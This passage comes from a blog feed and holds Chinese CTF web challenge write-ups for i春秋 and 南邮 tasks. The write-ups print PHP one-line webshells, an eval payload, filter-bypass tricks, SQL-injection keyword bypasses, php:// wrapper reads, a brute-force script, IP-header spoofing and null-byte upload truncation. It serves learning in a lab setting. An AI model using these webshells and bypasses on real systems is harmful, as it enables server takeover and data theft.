      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋-Web(一)</title>
      <link href="/2019/09/02/i%E6%98%A5%E7%A7%8B-Web(%E4%B8%80)/"/>
      <url>/2019/09/02/i%E6%98%A5%E7%A7%8B-Web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>做了几道i春秋的Web题，所以总结一下。</p><h3 id="Web1：爆破-1"><a href="#Web1：爆破-1" class="headerlink" title="Web1：爆破-1"></a>Web1：爆破-1</h3><p><img src="http://img-blog.csdnimg.cn/20190901200408309.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：某六位变量。查看题目，发现是代码审计<br><img src="http://img-blog.csdnimg.cn/20190901200619431.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&#39;hello&#39;];//以get或post传入hello，并赋值给`$a`if(!preg_match(&#39;/^\w*$/&#39;,$a )){//正则表达式^匹配一行的开头，$表示结束。\w表示匹配包括下划线的任何单词字符，等价于&#39;[A-Za-z0-9_]&#39;。*号：匹配前面的子表达式零次或多次。  die(&#39;ERROR&#39;);}eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。?&gt;</code></pre><p>1、如果匹配正则表达式/^\w<em>$/，就打印<code>变量 $$a</code><br>2、<code>$a</code>是hello，<code>$$a</code>是六位变量<code>$hello</code><br>接下来不会了，所以百度一下<br>发现超全局变量<code>$GLOBALS</code><br>*</em>作用**：<br>引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。<br>3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals<br>实际执行语句：</p><pre><code class="php">eval(&quot;var_dump($$a);&quot;)eval(&quot;var_dump($hello);&quot;)eval(&quot;var_dump($GLOBALS);&quot;)</code></pre><p>最终得到flag<br><img src="http://img-blog.csdnimg.cn/20190901202119861.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web2：爆破-2"><a href="#Web2：爆破-2" class="headerlink" title="Web2：爆破-2"></a>Web2：爆破-2</h3><p><img src="http://img-blog.csdnimg.cn/20190901202252191.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：flag不在变量中<br><img src="http://img-blog.csdnimg.cn/20190901202426442.jpg" alt="在这里插入图片描述"><br>审计代码，很明显是代码执行。一句话+菜刀(或蚁剑)拿到flag<br>pyload</p><pre><code class="php">http://bd5c2e087fb744a4abb30339f0c088bfba3400c37b8245fe.changame.ichunqiu.com/?hello=${@eval($_POST[1])}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190901202509546.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同时发现我这道题有多种解法，可以参考大佬博客：<a href="http://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=45706" target="_blank" rel="noopener">【i春秋】 Web —— 爆破-2</a></p><h3 id="Web3：爆破-3"><a href="#Web3：爆破-3" class="headerlink" title="Web3：爆破-3"></a>Web3：爆破-3</h3><p><img src="http://img-blog.csdnimg.cn/20190901203954601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：这个真是爆破<br><img src="http://img-blog.csdnimg.cn/2019090120421416.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>审计代码：<br>1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。<br>2、120秒之后会话结束。然后str_rands随机生成2个字母。<br>3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。<br>4、whoami=str_rands，循环10次后，输出flag。</p><p>所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。<br>但不会写脚本，所以借鉴了一下大佬的脚本：</p><pre><code class="python">import requestsurl = &quot;http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=ea&quot;al = [&#39;abcdefghijklmnopqrstuvwxyz&#39;]s = requests.session()r=s.get(url)for i in range(20):    url = &quot;http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=&quot; + r.content[0:2]    r=s.get(url)    print r.content</code></pre><p><img src="http://img-blog.csdnimg.cn/20190901205504982.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web4：Upload"><a href="#Web4：Upload" class="headerlink" title="Web4：Upload"></a>Web4：Upload</h3><p><img src="http://img-blog.csdnimg.cn/20190901205837396.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目提示，这道题是文件上传漏洞。上传一句话<br><img src="http://img-blog.csdnimg.cn/20190901210609342.jpg" alt="在这里插入图片描述"><br>查看，发现过滤了<code>&lt;?php</code><br><img src="http://img-blog.csdnimg.cn/20190901210711863.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询百度发现一句话也可以这样写：<br><a href="http://www.cnblogs.com/u0mo5/p/4901037.html" target="_blank" rel="noopener">各种一句话木马大全</a><br>找到一个。因为会过滤php，所以php写成pHp进行绕过。</p><pre><code class="php">&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;b&#39;])&lt;/script&gt;</code></pre><p>所以重新写下，然后上传。蚁剑(菜刀)一连成功<br><img src="http://img-blog.csdnimg.cn/20190902165946657.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以在后台找到flag了。</p><h3 id="Web5：SQL"><a href="#Web5：SQL" class="headerlink" title="Web5：SQL"></a>Web5：SQL</h3><p><img src="http://img-blog.csdnimg.cn/20190902170842612.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：SQL注入<br>flag在数据库。感觉可以联合查询注入。所以先判断整型还是字符型，是整型。查询列数，发现<br><img src="http://img-blog.csdnimg.cn/20190902171621599.jpg" alt="在这里插入图片描述"><br>额。。不知道什么原因，感觉像是被过滤了什么。绕过，emmmm。。。没有绕过成功。查看大佬博客发现通过<code>&lt;&gt;</code>进行绕过<br>大佬博客：<a href="http://www.cnblogs.com/xishaonian/p/7693136.html" target="_blank" rel="noopener">一次简单的ctf SQL注入绕过</a><br>试过后，发现只有<code>ord&lt;&gt;er</code>这种形式才能绕过。<br><img src="http://img-blog.csdnimg.cn/20190902170939956.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断显示位，“2”处是显示位。<br><img src="http://img-blog.csdnimg.cn/20190902172940986.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来当然是爆库、爆表、爆字段、爆数据了。注意select和and的绕过就行了(<code>sel&lt;&gt;ect</code>  <code>an&lt;&gt;d</code>)。最终得到flag<br><img src="http://img-blog.csdnimg.cn/20190902173031744.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web6：include"><a href="#Web6：include" class="headerlink" title="Web6：include"></a>Web6：include</h3><p><img src="http://img-blog.csdnimg.cn/20190902173436372.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：文件包含漏洞<br><img src="http://img-blog.csdnimg.cn/20190902173751169.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为PHP版本5.6.29，且allow_url_include为On、allow_url_fopen为Off。<br><img src="http://img-blog.csdnimg.cn/20190902175445763.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以可以使用php伪协议读取POST数据，POST数据可以是命令执行代码，用<code>ls</code>查看当前目录。<br><img src="http://img-blog.csdnimg.cn/20190902174112768.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到<code>dle345aae.php</code>，再用<code>php://filter</code>伪协议对文件进行读取，Base64转换一下，即可得到flag<br><img src="http://img-blog.csdnimg.cn/20190902174442883.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web7：who-are-you"><a href="#Web7：who-are-you" class="headerlink" title="Web7：who are you?"></a>Web7：who are you?</h3><p><img src="http://img-blog.csdnimg.cn/20190902175622648.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：who are you?(你是谁？)。一般情况下是admin<br><img src="http://img-blog.csdnimg.cn/20190902180026342.jpg" alt="在这里插入图片描述"><br>抓包，发现一串像Base64的字符<br><img src="http://img-blog.csdnimg.cn/20190902175801995.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Base64解密结果是：<code>f:5:&quot;thrfg&quot;;</code><br>把thrfg换成admin，Base64加密，加密结果替换role值。发包没有得到flag。<br>尝试无果，偷瞄一下大佬博客，rot13加密(凯撒密码码位移13)。。。解密结果：guest。<br>脑洞挺大。不过也貌似比较好想到，admin(管理员账户)，想到guest(来宾账户)。<br>所以admin，rot13加密、Base64加密。加密结果替换role值，发包得到<br><img src="http://img-blog.csdnimg.cn/20190902181306792.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示文件上传，查看源码<br><img src="http://img-blog.csdnimg.cn/20190902181730481.jpg" alt="在这里插入图片描述"><br>很明显应该一个是文件名，一个是数据<br>先构造一下变量：<code>filename=1.php&amp;data=&lt;?phpinfo();?&gt;</code><br>得到NO NO NO<br><img src="http://img-blog.csdnimg.cn/20190902181857746.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>应该是有正则匹配。不会绕，再次偷瞄大佬博客：<br><a href="http://www.jianshu.com/p/8e3b9d056da6?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation" target="_blank" rel="noopener">利用数组绕过问题小总结</a><br>php的函数一般都无法执行数组的，用数组来当参数，一般都能绕过。所以可以<code>data[]</code>，即<code>filename=1.php&amp;data[]=&lt;?phpinfo();?&gt;</code>。得到flag文件名<br><img src="http://img-blog.csdnimg.cn/20190902182214624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问，得到flag</p><h3 id="Web8：broken"><a href="#Web8：broken" class="headerlink" title="Web8：broken"></a>Web8：broken</h3><p>题目只提示了broken<br><img src="http://img-blog.csdnimg.cn/20190902192400617.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190902192228772.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到文件内容，很明显想到之前做过，是<code>jsfuck</code>编码。直接解，没解出来。因为题目已经提示文件损坏，所以了解一下<code>jsfuck</code>编码进行修复。<br><a href="http://blog.csdn.net/qq_36539075/article/details/79946099" target="_blank" rel="noopener">JSfuck原理解析一</a><br><a href="http://github.com/aemkei/jsfuck" target="_blank" rel="noopener">JSFuck</a><br>所以第一个<code>[</code>后应该加个<code>]</code>，jafuck解密弹出<br><img src="http://img-blog.csdnimg.cn/20190902193915169.jpg" alt="在这里插入图片描述"><br>emmm，flag没在这？！应该还有要修的的地方。。不会了。。<br>又一次偷瞄大佬博客：<br><img src="http://img-blog.csdnimg.cn/20190902195056291.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm，看了它一眼，然后没复现成功。</p><h3 id="Web9：Do-you-know-upload？"><a href="#Web9：Do-you-know-upload？" class="headerlink" title="Web9：Do you know upload？"></a>Web9：Do you know upload？</h3><p><img src="http://img-blog.csdnimg.cn/20190902200707224.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Do you know upload？(你知道文件上传吗？)，我知道文件上传。进入题目查看源码<br><img src="http://img-blog.csdnimg.cn/20190902200833432.jpg" alt="在这里插入图片描述"><br>很明显可以用php伪协议(<code>php://filter</code>)读取源码<br><img src="http://img-blog.csdnimg.cn/20190902201119266.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Base64解密，得到源码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;图片上传&lt;/h1&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;    &lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;br /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;!-- include($_GET[&#39;file&#39;]); --&gt;&lt;?phpinclude($_GET[&#39;file&#39;]); @$pic = $_FILES[&quot;file&quot;][&quot;name&quot;];@$pics = explode(&#39;.&#39; , $pic);if(@isset($_POST[submit])){    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;        }else{            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;            //echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])){                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;            }else{                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],                    &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];            }        }    }else{        echo &quot;&lt;script&gt;alert(&#39;文件类型不允许&#39;)&lt;/script&gt;&quot;;        echo &quot;Invalid file&quot;;    }}else{    // echo &quot;Invalid file&quot;;}?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>代码审计一下：<br>黑名单，文件类型只能是image/gif、image/jpeg、image/pjpeg。<br>所以，先将php一句话，文件后缀改为<code>.jpg</code>。<br>上传、抓包，将<code>.jpg</code>改为<code>.php</code>。上传成功<br><img src="http://img-blog.csdnimg.cn/20190902201750638.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑(菜刀)一连，连接成功<br><img src="http://img-blog.csdnimg.cn/2019090220183260.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有发现flag，发现了config.php。打开，里面有数据库用户名、密码、数据库名。蚁剑连接数据库，得到flag<br><img src="http://img-blog.csdnimg.cn/2019090220211136.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web10：Login"><a href="#Web10：Login" class="headerlink" title="Web10：Login"></a>Web10：Login</h3><p>打开题目查看源码，在最下方发现<br><img src="http://img-blog.csdnimg.cn/20190902202443154.jpg" alt="在这里插入图片描述"><br>应该就是用户名和密码，登录<br><img src="http://img-blog.csdnimg.cn/20190902202714960.jpg" alt="在这里插入图片描述"><br>只有这个。。。源码也没有有用信息<br>抓包，发包<br><img src="http://img-blog.csdnimg.cn/20190902202849397.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>响应头里发现特殊的东西<code>show</code>，且值为0。一般0表示假，1为真。<br>所以在请求头里将<code>show</code>的值写为1，发包<br><img src="http://img-blog.csdnimg.cn/20190902203219864.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到源码</p><pre><code class="php">&lt;?php    include &#39;common.php&#39;;    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);    class db    {        public $where;        function __wakeup()        {            if(!empty($this-&gt;where))            {                $this-&gt;select($this-&gt;where);            }        }        function select($where)        {            $sql = mysql_query(&#39;select * from user where &#39;.$where);            return @mysql_fetch_array($sql);        }    }    if(isset($requset[&#39;token&#39;]))    {        $login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));        $db = new db();        $row = $db-&gt;select(&#39;user=\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);        if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)        {            echo $flag;        }else if($row[&#39;pass&#39;] !== $login[&#39;pass&#39;]){            echo &#39;unserialize injection!!&#39;;        }else{            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;        }    }else{        header(&#39;Location: index.php?error=1&#39;);    }?&gt; </code></pre><p>审计代码，发现<br>只要<code>$login = unserialize(gzuncompress(base64_decode(requset[′token′])))</code>之后，<code>requset[′token′])))</code>之后，<code>login[‘user’] === &#39;ichunqiu’</code>即可。<br><img src="http://img-blog.csdnimg.cn/20190902203238237.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后写到cookie中的token中就行了，这个时候也必须有<code>show: 1</code>，发包得到flag。<br><img src="http://img-blog.csdnimg.cn/20190902203720601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>就先总结这么多。。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南邮-Web(二)</title>
      <link href="/2019/08/25/%E5%8D%97%E9%82%AE-Web(%E4%BA%8C)/"/>
      <url>/2019/08/25/%E5%8D%97%E9%82%AE-Web(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近又做了南邮的Web题，发现有的题崩了。不过已经把未崩的Web题做完了，再次总结一下</p><h3 id="Web15：伪装者"><a href="#Web15：伪装者" class="headerlink" title="Web15：伪装者"></a>Web15：伪装者</h3><p><img src="http://img-blog.csdnimg.cn/20190821221001992.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目没有提示。点进去发现<br><img src="http://img-blog.csdnimg.cn/20190821221130337.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现只能本地登录，才能得到flag。所以进行IP欺骗，即可得到flag。一般情况下是XFF(X-Forwarded-For)请求伪造。不过这道题试过之后，发现并没有什么用。查询百度：<br><a href="http://blog.csdn.net/zz_Caleb/article/details/84147066" target="_blank" rel="noopener">IP欺骗(XFF头等)</a><br>由此，可以使用<code>Client-IP: 127.0.0.1</code>进行本地IP欺骗。<br><img src="http://img-blog.csdnimg.cn/20190821221032984.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>伪造之后，Forword发包，得到flag<br><img src="http://img-blog.csdnimg.cn/2019082122175798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web16：Header"><a href="#Web16：Header" class="headerlink" title="Web16：Header"></a>Web16：Header</h3><p>发现题崩了，不过我下载过源码，所以本地搭建做一下<br><img src="http://img-blog.csdnimg.cn/20190821222442872.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目描述，很明显想到http请求头和响应头。截包发现flag在响应头里<br><img src="http://img-blog.csdnimg.cn/20190821222725291.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web17：上传绕过"><a href="#Web17：上传绕过" class="headerlink" title="Web17：上传绕过"></a>Web17：上传绕过</h3><p><img src="http://img-blog.csdnimg.cn/20190821222828598.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由题目描述，可以知道这道题考察的是文件上传漏洞。因为之前总结过，所以直接开始做题。<br>先随便上传一个文件，发现要求上传php后缀的文件<br><img src="http://img-blog.csdnimg.cn/20190821224025209.jpg" alt="在这里插入图片描述"><br>然后写一个php的一句话木马：</p><pre><code class="php">&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code></pre><p>再上传php文件<br><img src="http://img-blog.csdnimg.cn/20190821224349483.jpg" alt="在这里插入图片描述"><br><strong>绕过思路</strong>：先将<code>webshell.php</code>的<code>.php</code>后缀改为<code>.png</code>。然后上传该png文件，绕过黑名单，再将.png后缀变为.php。最后再去掉<code>.php</code><br>由此想到了00截断进行绕过，并且是POST型的。<br>先上传<code>webshell.png</code>，在/uploads/后加上<code>webshell.php+空格</code><br><img src="http://img-blog.csdnimg.cn/20190821223518522.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将空格0x20改为0x00<br><img src="http://img-blog.csdnimg.cn/20190821225827446.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>forward发包，得到flag<br><img 